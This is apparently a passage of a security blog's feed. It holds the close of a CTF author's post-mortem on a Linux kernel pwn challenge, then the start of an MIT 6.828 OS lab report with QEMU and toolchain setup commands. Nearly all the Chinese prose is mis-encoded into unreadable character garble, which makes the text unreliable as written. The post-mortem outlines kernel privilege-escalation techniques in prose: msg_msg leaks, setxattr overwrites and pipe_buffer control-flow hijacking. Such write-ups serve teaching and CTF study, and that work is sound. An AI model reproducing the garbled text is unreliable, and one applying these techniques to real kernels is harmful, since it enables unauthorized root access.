æ”¯ä¹‹å¤šï¼Œç¬”è€…åŸä»¥ä¸ºæ˜¯è‡ªèº«å‡ºé¢˜æ°´å‡†ä¸è¶³ä»¥è‡³äºå‡ºçš„é¢˜ç›®åªæœ‰ç­¾åˆ°é¢˜æ°´å¹³äºæ˜¯è¢«å„å¤§æˆ˜é˜Ÿç§’æ€ï¼ˆè™½ç„¶ç¬”è€…æœ¬èº«å°±å¾ˆèœï¼‰ï¼Œä½†äº‹æƒ…å¾€å¾€æ²¡æœ‰ç¬”è€…æ‰€æƒ³çš„é‚£ä¹ˆç®€å•</p><p>åœ¨æ¯”èµ›ç»“æŸæ—¶ï¼Œæˆ‘ä»¬å‘æ”¾äº†ä¸€ä»½è°ƒæŸ¥é—®å·ï¼Œè€Œç¬”è€…åœ¨å…¶ä¸­çœ‹åˆ°äº†ä¸€æ¡å¯¹ç¬”è€…é¢˜ç›®çš„è¯„ä»·â€”â€”</p><p><img src="https://s2.loli.net/2022/03/08/64O12YCIPXuj35t.png" alt="image.png"></p><p>ç¬”è€…åœ¨çœ‹åˆ°è¿™æ¡æ¶ˆæ¯ä¹‹åæ•´ä¸ªå¤§è„‘ä¸€ç‰‡ç©ºç™½ï¼Œé©¬ä¸Šä»æ¯”èµ›å¹³å°ä¸Šä¸‹è½½ä¸‹æ¥é¢˜ç›®é™„ä»¶ï¼Œè§£å‹ï¼Œæœç„¶åœ¨ <code>/tmp</code> ç›®å½•ä¸‹çœ‹åˆ°äº†ä¸€ä¸ªç†Ÿæ‚‰çš„ <code>exp</code> æ–‡ä»¶â€¦</p><p><img src="https://s2.loli.net/2022/03/08/gartTlFBis2xALv.png" alt="image.png"></p><p>èµ›åç¬”è€…æŸ¥é˜…é€‰æ‰‹ä»¬çš„ wpï¼Œ<strong>ç¡®ä¹æ˜¯æœ‰ä¸€åŠçš„é˜Ÿä¼åˆ©ç”¨ç¬”è€…ç•™ä¸‹æ¥çš„ exp è§£å‡ºäº†è¿™é“é¢˜</strong>ï¼Œè¿™ä¹Ÿä»¤è¿™é“é¢˜çš„åšé¢˜ä½“éªŒå¤§æ‰“æŠ˜æ‰£ï¼Œåœ¨è¿™é‡Œç¬”è€…å‘å¤§å®¶çŒ®ä¸Šæœ€è¯šæŒšçš„æ­‰æ„ğŸ™‡ğŸ½â€â™‚ï¸ğŸ™‡ğŸ½â€â™‚ï¸ğŸ™‡ğŸ½â€â™‚ï¸ï¼ï¼ï¼</p><p>ä¸è¿‡æ¯”è¾ƒå¹¸è¿çš„ä¸€ç‚¹æ˜¯ç¬”è€…æœ¬åœ°æµ‹è¯•æ—¶æ˜¯ç›´æ¥åœ¨æ ¹ç›®å½•ä¸‹æµ‹è¯•çš„ï¼Œå› æ­¤ setxattr çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <code>/exp</code>ï¼Œè€Œå¯¹äºè¿œç¨‹ç¯å¢ƒè€Œè¨€æ ¹ç›®å½•å¯¹é€‰æ‰‹æ˜¯ä¸å¯å†™çš„ï¼Œé€‰æ‰‹çš„ exp è·¯å¾„åº”å½“ä¸º <code>/tmp/exp</code>ï¼Œè¿™ä¹Ÿè®©è¿™ä¸ª exp æ— æ³•è¢«ç›´æ¥æ‰“é€šï¼ˆå¦åˆ™å¯èƒ½è§£é¢˜é˜Ÿä¼æ•°é‡è¿˜å¾—ç¿»ä¸ªæ•°åå€â€¦ï¼‰ï¼Œä¸è¿‡é€‰æ‰‹ä»å¯ä»¥é€†å‘å‡º exp é€»è¾‘åè¿›è¡Œä¿®æ”¹</p><p>wp ä¸­åªæœ‰å››æ”¯é˜Ÿä¼æ˜¯æ­£å¸¸åšé¢˜çš„ï¼Œè§£æ³•åŸºæœ¬ä¸Šéƒ½æ˜¯é¢„æœŸè§£â€”â€”ä½¿ç”¨ <code>msg_msg</code> æ³„éœ²ä¿¡æ¯ä¸ <code>pipe_buffer</code> åŠ«æŒ RIPï¼Œä¸è¿‡éƒ½æ¯”ç¬”è€…è¿™ä¸ªç¬¨æ‹™çš„è§£æ³•è¦ä¼˜ç§€ä¸Šè®¸å¤šï¼ˆç¬‘ï¼‰ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥å½’ä¸ºä¸¤ç§é¢˜è§£ï¼š</p><ul><li>å–·å°„ pipe_buffer ä¸ sk_buffï¼Œå‚ç…§ CVE-2021-22555 çš„è§£æ³•å®Œæˆè§£é¢˜ï¼ˆ3æ”¯é˜Ÿä¼ï¼‰</li><li>å–·å°„å¤§é‡ pipe_buffer åç›´æ¥ç”¨ setxattr ä¿®æ”¹ msg_msg è¶Šç•Œè¯»æ³„éœ²å‡º kernel baseï¼Œä¿®æ”¹ msg_msg-&gt;next åˆ° <code>vmemmap_base</code> å‰ 8 å­—èŠ‚ï¼ˆåˆšå¥½ä¸º NULLï¼‰ï¼Œè¿™ä¸ªåœ°æ–¹å­˜æ”¾äº†å‡ ä¸ªå…¨å±€å˜é‡ï¼ˆæŒ‡å‘ <code>vmemmap_base</code>ã€<code>vmalloc_base</code>ã€<code>page_offset_base</code> çš„æŒ‡é’ˆç­‰éƒ½åœ¨è¿™é‡Œï¼‰ï¼Œè¯»å‡ºâ€œå †åŸºå€â€åç”¨ä¸€ä¸ªå †ä¸Šåœ°å€ä¿®å¤ msg_msg çš„ headerï¼Œç„¶ååŠ«æŒ pipe_bufferã€‚è¿™ä¸ªè§£æ³•å’Œç¬”è€…çš„è§£æ³•åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„</li></ul><p>ç¬”è€…åœ¨å‡ºé¢˜è¿‡ç¨‹ä¸­å…¶å®ä¹Ÿçœ‹åˆ°äº† CVE-2021-22555ï¼Œè¿™ä¸ªæ¼æ´æœ¬èº«æ˜¯ä¸€ä¸ª off-by-nullï¼Œæœ€åè½¬åŒ–ä¸ºä¸€ä¸ª UAF è¿›è¡Œåˆ©ç”¨ï¼Œå› æ­¤ä¸ç¬”è€…çš„è¿™é“é¢˜æœ€ç»ˆæ˜¯å¯ä»¥æ®Šé€”åŒå½’çš„ï¼Œäº‹å®è¯æ˜æ­£å¸¸è§£é¢˜çš„é˜Ÿä¼åŸºæœ¬ä¸Šéƒ½å‚ç…§äº†è¿™ä¸ªæ¼æ´ï¼ˆç¬‘ï¼‰ï¼Œä¸è¿‡ç¬”è€…è¿˜æ˜¯å¸Œæœ›èƒ½å¤Ÿæ¢ç´¢å‡ºä¸€æ¡åˆ«çš„é“è·¯ï¼Œæ‰€ä»¥ä½ åœ¨ä¸Šé¢çœ‹åˆ°çš„ç¬”è€…çš„è§£æ³•å…¶å®ä¸è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹å¹¶éæ˜¯å®Œå…¨ä¸€æ ·çš„</p><blockquote><p>å¤–å›½å‹äººå¯¹æœ¬é¢˜çš„è¯„ä»·ï¼š</p><blockquote><p>This is a standard kernel pwn challenge. We are given an unprivileged shell in a Linux VM, and the flag can only be read by root. The VM loads a vulnerable kernel module, which we have to exploit to gain root privileges and read the flag.</p></blockquote><p>è¯´å®è¯è¿™ä¸€æ¬¡å‡ºé¢˜ç¡®å®è¿˜æ˜¯æ¯”è¾ƒå¸¸è§„ï¼Œå¸Œæœ›ç¬”è€…æ˜å¹´èƒ½å¤Ÿæƒ³åˆ°ä¸€äº›æ›´å¥½çš„ä¸œè¥¿XD</p></blockquote><h1>0x05.æ€»ç»“ä¸åæ€</h1><p>è™½ç„¶åœ¨å®˜æ–¹è§£æ³•ä¸­ä½¿ç”¨äº†â€œçœ‹ä¼¼éå¸¸é€šç”¨çš„è§£æ³•â€è§£å‡ºäº†è¿™é“é¢˜ï¼Œä½†ç¬”è€…å…¶å®æ˜¯ä¸å¤ªæ»¡æ„çš„ï¼š</p><ul><li>è¯¥æ–¹æ³•ä»…é€‚ç”¨äºè¾ƒå¤§çš„ objectï¼Œå¯¹äºå°ä¸€ç‚¹çš„ object æˆ–è€… kmem_cache-&gt;offset ä¸º 0 çš„æƒ…å†µåˆ™<strong>å¾ˆå®¹æ˜“è®©æˆ‘ä»¬æ— æ³•ä¿®å¤ msg_msgï¼Œç”šè‡³å°±æ— æ³•åˆ†é… msg_msg</strong> ï¼ˆå°äº 0x30 çš„æƒ…å†µï¼‰</li><li>åœ¨åŠ«æŒ RIP çš„è¿‡ç¨‹å½“ä¸­<strong>ä»ç„¶éœ€è¦æ ¹æ® object å¤§å°å»æ‰¾å¯¹åº”çš„å¯ç”¨ç»“æ„ä½“</strong>ï¼Œè€Œæ²¡æœ‰ä¸€ä¸ªæ›´åŠ <strong>é€šç”¨</strong>çš„åŠ«æŒæ§åˆ¶æµçš„åŠæ³•ï¼Œè¿™æ— ç–‘é€ æˆäº†ç›¸å½“ç¨‹åº¦çš„é™åˆ¶</li><li>å¯¹äºç‹¬ç«‹çš„ kmem_cache è€Œè¨€<strong>æ— æ³•ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œåˆ©ç”¨</strong>ï¼Œå› ä¸ºæ­¤æ—¶ msg_msg ä¸ä»è¯¥å¤„åˆ†é…</li><li><strong>çœŸå®ç¯å¢ƒä¸­åœ¨è¿›è¡Œå†…å­˜åˆ†é…çš„å¹¶éåªæœ‰æˆ‘ä»¬</strong>ï¼Œå¾ˆå®¹æ˜“è¢«å…¶ä»–è¿›ç¨‹æ‹¿åˆ° freelist é€ æˆ kernel panic</li><li>è¿™ä¸ªæ–¹æ³•ä¼¼ä¹å¹¶ä¸èƒ½åœ¨æ³› Linux å¹³å°ä¸Šé€šç”¨ï¼ˆæ®æ‚‰ Android å¹¶ä¸èƒ½ä½¿ç”¨è¿™ä¸€å¥— IPC APIï¼Œç¬”è€…å°šæœªæŸ¥è¯ï¼‰</li></ul><p>å› æ­¤ç¬”è€…è®¤ä¸ºè¿™é“é¢˜ç›®å……å…¶é‡èƒ½åœ¨ D3CTF è¿™ä¸€æ¡£æ¬¡çš„æ¯”èµ›ä¸­å……å½“ç­¾åˆ°é¢˜ï¼Œä½†ç¬”è€…è¿˜æ˜¯å¸Œæœ›ç¬”è€…å¯¹â€œé€šè§£â€çš„æ¢ç´¢èƒ½å¤Ÿç»™å¤§å®¶å¸¦æ¥ä¸€äº›æ–°çš„æ€è€ƒï¼ˆç¬‘ï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¬è¯´ sb å‡ºé¢˜äººæŠŠ exp ä¹Ÿç»™æ‰“åŒ…å‘å¸ƒäº†ï¼Œæ¯”èµ›ç»“æŸæ‰å‘ç°&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="D^3CTF" scheme="http://blog.arttnba3.cn/tags/D-3CTF/"/>
    
  </entry>
  
  <entry>
    <title>ã€EXPR.0x00ã€‘MIT 6.828 è¯¾ç¨‹å®éªŒæŠ¥å‘Š</title>
    <link href="http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/"/>
    <id>http://blog.arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/</id>
    <published>2022-02-20T18:57:25.000Z</published>
    <updated>2022-10-20T16:30:13.929Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸å¦‚ Windows XP å¥½ç”¨</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡åšå®¢ï¼Ÿå‚è§ <a href="https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/">https://arttnba3.cn/2022/03/18/PIECES-0X03-SHELL_OUTSIDE-3-IDEALIST_DEATH/</a></p></blockquote><p>MIT 6.828 æ˜¯ååˆ†è‘—åçš„ä¸€ä¸ªç»¼åˆæ€§çš„æ“ä½œç³»ç»Ÿå®éªŒè¯¾ç¨‹ï¼Œç”±éº»çœç†å·¥å¤§å­¦ï¼ˆMITï¼‰å¼€è®¾ï¼Œä¸€å…±æœ‰ 6 ä¸ª labï¼ŒåŸºäº XV6â€”â€”ä¸€ä¸ªä¸ºOSè¯¾ç¨‹æ•™å­¦è€Œå¼€å‘çš„ OS kernelï¼Œæ‰‹æŠŠæ‰‹å¸¦ä½ ä¸€æ­¥æ­¥è¡¥å…¨ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ã€‚ç¬”è€…è®¤ä¸ºè¿™æ˜¯ååˆ†ä¼˜ç§€ä¸”å¯Œæœ‰å®Œæˆä»·å€¼çš„ä¸€ä¸ª OS å®éªŒï¼Œå› æ­¤ç¬”è€…å†³å®šè¶å¤§ä¸‰å¯’å‡å®ä¹ çš„ç©ºé—²æ—¶é—´å°†æœ¬è¯¾ç¨‹è¡¥å®Œã€‚</p><p>ç¬”è€…é€‰ç”¨å…¶ 2018 å¹´çš„å®éªŒè¯¾ç¨‹ï¼Œå› ä¸ºè‡ªä» 2019 èµ·ä»–ä»¬è½¬å‘äº† RISC-Vï¼Œè€Œç¬”è€…æš‚æ—¶ä¸æƒ³ç¦»å¼€ X86 çš„èˆ’é€‚åŒºï¼ˆç¬‘ï¼‰ï¼Œå› ä¸ºæœ¬æ¬¡å®éªŒçš„ä¸»è¦ç›®çš„è¿˜æ˜¯å­¦ä¹ æ“ä½œç³»ç»Ÿï¼Œç¬”è€…ä¸æƒ³åœ¨å­¦ä¹ å…¶ä»–æ¶æ„ä¸ŠèŠ±è´¹å¤ªå¤šæ—¶é—´</p><h2 id="PRE-ç¯å¢ƒæ­å»º">PRE.ç¯å¢ƒæ­å»º</h2><blockquote><p>å‚è§ <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">https://pdos.csail.mit.edu/6.828/2018/tools.html</a></p><h1>Tools Used in 6.828</h1><p>Youâ€™ll use two sets of tools in this class: an x86 emulator, <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#qemu">QEMU</a>, for running your kernel; and a <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html#chain">compiler toolchain</a>, including assembler, linker, C compiler, and debugger, for compiling and testing your kernel. This page has the information youâ€™ll need to download and install your own copies. This class assumes familiarity with Unix commands throughout.</p><p>We highly recommend using a Debathena machine, such as <a href="http://athena.dialup.mit.edu">athena.dialup.mit.edu</a>, to work on the labs. If you use the MIT Athena machines that run Linux, then all the software tools you will need for this course are located in the 6.828 locker: just type â€˜add -f 6.828â€™ to get access to them.</p><p>If you donâ€™t have access to a Debathena machine, we recommend you use a virtual machine with Linux. If you really want to, you can build and install the tools on your own machine. We have instructions below for Linux and MacOS computers.</p><p>It should be possible to get this development environment running under windows with the help of <a href="http://www.cygwin.com/">Cygwin</a>. Install cygwin, and be sure to install theÂ flexÂ andÂ bisonÂ packages (they are under the development header).</p><p>For an overview of useful commands in the tools used in 6.828, see the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>.</p></blockquote><p>ä¸ºäº†å¼€å§‹æœ¬æ¬¡å®éªŒï¼Œæˆ‘ä»¬ä¸»è¦éœ€è¦è¿™ä¸¤æ ·ä¸œè¥¿ï¼š</p><ul><li><p>ä¸€ä¸ª x86 æ¨¡æ‹Ÿå™¨ï¼šQEMUâ€”â€”ç”¨ä»¥è¿è¡Œå†…æ ¸</p></li><li><p>ä¸€å¥—ç¼–è¯‘å·¥å…·ï¼ŒåŒ…æ‹¬æ±‡ç¼–å™¨ã€é“¾æ¥å™¨ã€C ç¼–è¯‘å™¨ã€è°ƒè¯•å™¨â€”â€”ç”¨ä»¥ç¼–è¯‘ä¸æµ‹è¯•å†…æ ¸</p></li></ul><h3 id="Compiler-Toolchain">Compiler Toolchain</h3><p>ä¸ºäº†å®Œæˆæœ¬æ¬¡å®éªŒï¼Œç¬”è€…ç”¨äº†ä¸€ä¸ªè¿‘ä¹å…¨æ–°çš„ Ubuntu 21.10ï¼ŒæŒ‰è¯¾ç¨‹é¡µé¢è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y build-essential gdb</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ï¼Œå‡ºç°ç±»ä¼¼ä¸‹é¢çš„è¾“å‡ºè¯´æ˜å®‰è£…æˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -m32 -print-libgcc-file-name</span><br>/usr/lib/gcc/x86_64-linux-gnu/8/32/libgcc.a<br></code></pre></td></tr></table></figure><h3 id="QEMU-Emulator">QEMU Emulator</h3><p>ä¸ºäº†æ›´å¥½åœ°è¿›è¡Œå®éªŒï¼ŒMIT 6.828 è¯¾ç¨‹çš„æ•™å¸ˆä»¬å°† qemu è¿›è¡Œäº†ä¸€å®šçš„æ”¹é€ ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ç¼–è¯‘å®‰è£… patch åçš„ QEMU</p><p>é¦–å…ˆè¡¥å……å®‰è£…ä¸€äº›åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install libsdl1.2-dev libtool-bin libglib2.0-dev libz-dev libpixman-1-dev</span><br></code></pre></td></tr></table></figure><p>ä» GitHub æ‹‰æºç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/mit-pdos/6.828-qemu.git qemu</span><br></code></pre></td></tr></table></figure><p>åœ¨æºç ç›®å½•ä¸‹è¿›è¡Œéœ€è¦çš„é…ç½®ï¼Œ<code>[]</code> é‡Œçš„æ˜¯å¯é€‰é¡¹ï¼ˆè¾“å…¥å‘½ä»¤æ—¶ä¸å¸¦è¿™ä¸ªæ¡†ï¼‰</p><ul><li><p><code>--prefix=PFX</code>ï¼šæŒ‡å®šå®‰è£… qemu çš„ç›®å½•ï¼Œè‹¥æœªæŒ‡å®šåˆ™é»˜è®¤ä¸º <code>/usr/local</code></p></li><li><p><code>--target-list=&quot;i386-softmmu x86_64-softmmu</code>ï¼šç²¾ç®€åŒ–è¦å®‰è£…çš„æ¶æ„</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./configure --disable-kvm --disable-werror [--prefix=PFX] [--target-list=<span class="hljs-string">&quot;i386-softmmu x86_64-softmmu&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>æœ€åç¼–è¯‘å°±å®Œäº‹äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><blockquote><h3 id="å¯èƒ½å‡ºç°çš„é”™è¯¯">å¯èƒ½å‡ºç°çš„é”™è¯¯</h3><p>ç¬”è€…åœ¨ç¼–è¯‘ qemu æ—¶é‡åˆ°äº†è¿™æ ·çš„é”™è¯¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">...<br>  CC    stubs/qmp_pc_dimm_device_list.o<br>  AR    libqemustub.a<br>  LINK  qemu-ga<br>/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor&#x27;:<br>/home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:633: undefined reference to `major&#x27;<br>/usr/bin/ld: /home/arttnba3/Desktop/MIT_6.828/qqemu/qga/commands-posix.c:634: undefined reference to `minor&#x27;<br>collect2: error: ld returned 1 exit status<br>make: *** [Makefile:288: qemu-ga] Error 1<br></code></pre></td></tr></table></figure><p>å‚ç…§ <a href="http://patchwork.ozlabs.org/patch/709415/">[v3] build: include sys/sysmacros.h for major() and minor() - Patchwork</a> ï¼Œåœ¨ qemu æºç ç›®å½•ä¸‹çš„ <code>qga/commands-posix.c</code> åŠ ä¸Šä¸€ä¸ª <code>#include &lt;sys/sysmacros.h&gt;</code></p><p>ç»§ç»­ make installï¼Œä¹‹åè¿˜å¯èƒ½å‡ºç°è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">...<br>  Building optionrom/kvmvapic.img<br>  Building optionrom/kvmvapic.raw<br>  Signing optionrom/kvmvapic.bin<br>install -d -m <span class="hljs-number">0755</span> <span class="hljs-string">&quot;/usr/local/share/qemu&quot;</span><br>install: cannot change permissions of â€˜<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>qemuâ€™: No such <span class="hljs-keyword">file</span> or directory<br>make: *** [Makefile:<span class="hljs-number">382</span>: install-datadir] Error <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»º <code>/usr/local/share/qemu</code> è¿™ä¸ªç›®å½•å³å¯</p><p>ä¹‹åç»§ç»­ make installï¼ŒåˆæŠ¥ç¼ºä¸€ä¸ªç›®å½•çš„é”™è¯¯ï¼ˆä¸èƒ½ä¸€æ¬¡æŠ¥å®Œå˜› - - ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">install -d -m 0755 &quot;/usr/local/share/qemu&quot;<br>install -d -m 0755 &quot;/usr/local/etc/qemu&quot;<br>install: cannot change permissions of â€˜/usr/local/etc/qemuâ€™: No such file or directory<br>make: *** [Makefile:392: install-confdir] Error 1<br></code></pre></td></tr></table></figure><p>ä¾æ—§æ‰‹åŠ¨åˆ›å»ºä¹‹ï¼Œç„¶å make installï¼Œè¿™é‡Œéœ€è¦æ³¨æ„æˆ‘ä»¬åº”å½“ä»¥ root æƒé™æ‰§è¡Œ</p></blockquote><h1>0x01.Lab 1: Booting a PC</h1><blockquote><p>lab é¡µé¢ï¼š <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/%5D">[https://pdos.csail.mit.edu/6.828/2018/labs/lab1/]</a>(<a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/">Lab 1: PC Bootstrap and GCC Calling Conventions</a>)</p></blockquote><blockquote><p>è¯¥ lab å¤§é‡å†…å®¹ä¸ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">ã€CODE.0x00ã€‘ä»é›¶å¼€å§‹çš„32ä½æ“ä½œç³»ç»Ÿå¼€å‘æ‰‹è®° - arttnba3â€™s blog</a>é‡å¤ï¼Œ<strong>ç›¸å…³çŸ¥è¯†ç¬”è€…äºæœ¬ç¯‡åšå®¢ä¸­ä»…åšç®€è¿°ï¼Œä¸å†é‡å¤æ‘˜æŠ„ï¼Œå¦‚æœ‰éœ€è¦è¯·è‡ªè¡Œé˜…è¯»ç¬”è€…çš„è¿™ç¯‡åšå®¢</strong></p></blockquote><p>è¯¥ lab æ€»å…±ä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ul><li><p>ç†Ÿæ‚‰ x86 æ±‡ç¼–è¯­è¨€ã€QEMU x86 æ¨¡æ‹Ÿå™¨ã€PCçš„å¼€æœºå¼•å¯¼æµç¨‹</p></li><li><p>æµ‹è¯•æˆ‘ä»¬ç”¨äºå¼•å¯¼å†…æ ¸çš„ boot loaderï¼ˆxv6æºç ä¸‹ <code>boot</code> ç›®å½•ï¼‰</p></li><li><p>æ·±å…¥ç ”ç©¶ 6.828 å†…æ ¸çš„åˆå§‹æ¨¡æ¿ï¼ˆJOSï¼‰</p></li></ul><p>åœ¨å¼€å§‹å®éªŒä¹‹å‰æˆ‘ä»¬é¦–å…ˆæŠŠ xv6 æºç æ‹‰åˆ°æœ¬åœ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://pdos.csail.mit.edu/6.828/2018/jos.git lab</span><br></code></pre></td></tr></table></figure><p>å¯¹äº MIT çš„å­¦ç”Ÿæ¥è¯´éœ€è¦å°†å®éªŒè¿‡ç¨‹ <code>make handin</code> ä¹‹åæäº¤åˆ°å¯¹åº”çš„ä»“åº“ï¼Œä¸è¿‡ç¬”è€…åªæ˜¯å¤§æ´‹å½¼å²¸æ—å¬çš„ï¼ˆç¬‘ï¼‰æ‰€ä»¥è¿™ä¸€æ­¥å°±è·³è¿‡äº†</p><h2 id="Part-1-PC-Bootstrap">Part 1: PC Bootstrap</h2><p>è¿™ä¸€éƒ¨åˆ†çš„ä¸»è¦ç›®çš„æ˜¯è®©å­¦ç”Ÿç†Ÿæ‚‰<strong>ä¸€ä¸ªè®¡ç®—æœºæ˜¯å¦‚ä½•å¯åŠ¨çš„</strong>ï¼Œé€šç”µâ€”â€”è½½å…¥ BIOSâ€”â€”BIOSè½½å…¥ MBRâ€”â€”è·³è½¬åˆ° MBRâ€”â€”ï¼ˆè½½å…¥ loaderï¼‰â€”â€”è½½å…¥å†…æ ¸</p><blockquote><p>å‚è§ç¬”è€…çš„<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">è¿™ç¯‡åšå®¢</a></p></blockquote><h3 id="Getting-Started-with-x86-assembly">Getting Started with x86 assembly</h3><p>MIT ä¸ºé‚£äº›ä¸ç†Ÿæ‚‰ x86 æ±‡ç¼–è¯­è¨€çš„äººå‡†å¤‡äº† <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pcasm-book.pdf">PC Assembly Language Book</a>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ Exercise1ï¼š</p><blockquote><p>Exercise 1.Â Familiarize yourself with the assembly language materials available on <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">the 6.828 reference page</a>. You donâ€™t have to read them now, but youâ€™ll almost certainly want to refer to some of this material when reading and writing x86 assembly.</p><p>We do recommend reading the section â€œThe Syntaxâ€ in <a href="http://www.delorie.com/djgpp/doc/brennan/brennan_att_inline_djgpp.html">Brennanâ€™s Guide to Inline Assembly</a>. It gives a good (and quite brief) description of the AT&amp;T assembly syntax weâ€™ll be using with the GNU assembler in JOS.</p></blockquote><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦å°±æ˜¯ç†Ÿæ‚‰ x86 æ±‡ç¼–è¯­è¨€ï¼Œç¬”è€…åœ¨é«˜ä¸­çš„æ—¶å€™å°±å·²ç»ä¼šäº†æ•…è¿™é‡Œç›´æ¥è·³è¿‡ï¼ˆç¬‘ï¼‰ï¼Œä¸è¿‡å…¶æ¨èçš„ææ–™è¿˜æ˜¯å€¼å¾—ä¸€è¯»çš„ã€‚</p><p>æ¯”è¾ƒä»¤ç¬”è€…ä¸é€‚çš„æ˜¯å®éªŒä¸­æ¶‰åŠåˆ°çš„æ±‡ç¼–ä»£ç éƒ½æ˜¯ä¸‘é™‹çš„ AT&amp;T è¯­æ³•è€Œå¹¶éä¼˜ç¾çš„ x86 è¯­æ³•ï¼ˆæ¼ï¼‰</p><h3 id="Simulating-the-x86">Simulating the x86</h3><p>è¿™ä¸€æ­¥æˆ‘ä»¬å¼€å§‹ç¼–è¯‘ JOSï¼ˆxv6ï¼‰å¹¶å°è¯•ä½¿ç”¨ qemu è¿è¡Œï¼Œåœ¨åˆšåˆš clone ä¸‹æ¥çš„æºç ç›®å½•ä¸‹è¿›è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span 